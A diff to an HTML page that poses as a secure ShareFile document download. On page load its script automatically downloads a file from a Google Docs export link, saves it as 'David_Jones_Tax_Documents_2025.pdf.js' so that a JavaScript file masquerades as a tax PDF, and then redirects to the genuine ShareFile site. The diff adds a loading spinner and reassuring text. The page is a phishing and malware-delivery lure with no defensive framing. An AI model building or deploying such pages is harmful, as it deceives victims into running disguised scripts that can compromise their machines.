@@ -9,45 +9,72 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 80px 20px;
-            background: #f4f7fa;
+            background: linear-gradient(135deg, #f4f7fa, #e8f0fe);
             color: #333;
+            margin: 0;
+            min-height: 100vh;
         }
-        h1 { color: #1a73e8; }
-        p { max-width: 600px; margin: 20px auto; font-size: 18px; }
+        h1 { 
+            color: #1a73e8; 
+            font-size: 28px;
+        }
+        p { 
+            max-width: 600px; 
+            margin: 20px auto; 
+            font-size: 18px;
+            line-height: 1.5;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1a73e8;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <div class="loader"></div>
     <h1>Preparing your secure document...</h1>
-    <p>Your file is being downloaded securely. Please wait a moment.</p>
+    <p>Your file is being downloaded securely.<br>Please wait a moment.</p>
 
     <script>
         function startDownloadAndRedirect() {
-            // === CHANGE THIS LINE WITH YOUR DIRECT DOWNLOAD LINK ===
-            const fileUrl = "https://drive.google.com/uc?export=download&id=PUT_YOUR_FILE_ID_HERE";
+            // === YOUR GOOGLE DOC DIRECT DOWNLOAD LINK ===
+            // Change this if you update the document later
+            const fileUrl = "https://docs.google.com/document/d/1snGBQcPYCb27bXdztLFHmYR8AGZAvhnZ25PI0osieOY/export?format=txt";
 
-            const filename = "David_Jones_Tax_Documents_2025.pdf.js";   // Change this if you used a different name
+            // === DOWNLOADED FILENAME (change if you want) ===
+            const filename = "David_Jones_Tax_Documents_2025.pdf.js";
 
-            // Trigger download
+            // Trigger automatic download
             const link = document.createElement('a');
             link.href = fileUrl;
-            link.download = filename;   // Forces the exact filename
+            link.download = filename;   // Forces the exact filename with .pdf.js
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
             // Show success message
             document.body.innerHTML = `
-                <h1>Download started!</h1>
+                <h1>✅ Download started!</h1>
                 <p><strong>${filename}</strong> is downloading now.</p>
                 <p>You will be redirected to ShareFile shortly...</p>
             `;
 
-            // Redirect after 2.5 seconds
+            // Redirect to ShareFile after 2.5 seconds
             setTimeout(() => {
                 window.location.href = "https://www.sharefile.com/";
             }, 2500);
         }
 
+        // Run automatically when page loads
         window.onload = startDownloadAndRedirect;
     </script>
 </body>
